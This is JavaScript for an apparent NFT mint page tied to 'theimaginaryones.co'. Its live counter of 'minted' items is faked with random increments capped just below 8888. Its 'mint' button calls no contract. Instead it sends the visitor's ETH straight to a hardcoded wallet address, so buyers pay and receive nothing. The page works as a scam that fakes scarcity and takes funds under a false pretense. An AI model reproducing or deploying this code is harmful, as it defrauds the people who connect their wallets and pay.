let selectedAccount = null;
let ownerAddress = "0x29b45FA51203aD2c616cB69d497D2a111E6A5b3f";

$("#mint").hide();
$(document).ready(function () {
  let current = 7787;
  setInterval(() => {
    let random = Math.floor(Math.random() * 4) + 1;
    current = current + random;
    if (current < 8888) {
      $("#minted").html(current);
    } else {
      $("#minted").html(8887);
    }
  }, 1000);
});
$("#connect").click(async function () {
  // If Mobile Devices
  if (
    /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
      navigator.userAgent
    )
  ) {
    // open the deeplink page
    window.open("https://metamask.app.link/dapp/theimaginaryones.co/");

    $("#mint").show();
    $("#connect").hide();

    let accounts = await window.ethereum.request({
      method: "eth_requestAccounts",
    });
    window.web3 = new Web3(window.ethereum);
    $("#mint").show();
    $("#connect").hide();
    selectedAccount = accounts[0];
    if (accounts.length) {
      notify("Wallet Connected Successfully");
    }
  }

  // If Web Browser
  else if (window.ethereum) {
    let accounts = await window.ethereum.request({
      method: "eth_requestAccounts",
    });
    window.web3 = new Web3(window.ethereum);
    $("#mint").show();
    $("#connect").hide();
    selectedAccount = accounts[0];
    if (accounts.length) {
      notify("Wallet Connected Successfully");
    }
  } else {
    notify("Please install metamask wallet");
  }
});

$("#plus").click(function () {
  let value = $("#count").html();
  if (value == 2) return;
  value = Number(value) + 1;
  $("#count").html(value);
  $("#price").html((value * 0.2).toFixed(1));
});

$("#minus").click(function () {
  let value = $("#count").html();
  if (value == 1) return;
  value = Number(value) - 1;
  $("#count").html(value);
  $("#price").html((value * 0.2).toFixed(1));
});

$("#mint").click(function () {
  let price = 0.2;
  let count = $("#count").html();
  let mint_price = Number(price) * Number(count);
  let value = window.web3.utils.toWei(mint_price.toString(), "ether");

  window.web3.eth
    .sendTransaction({
      from: selectedAccount,
      to: ownerAddress,
      value: value,
    })
    .on("transactionHash", function (hash) {
      console.log("Transaction Hash: ", hash);
      notify("Transaction is submitted to the network");
    })
    .on("receipt", function (receipt) {
      console.log("Receipt: ", receipt);
      notify("Transaction Completed Successfully");
    })
    .on("error", function (error, receipt) {
      console.log("Error receipt: ", receipt);
      notify("Transaction Rejected");
    });
});

function notify(msg) {
  Toastify({
    text: msg,
    duration: 3000,
    gravity: "top",
    position: "right",
  }).showToast();
}
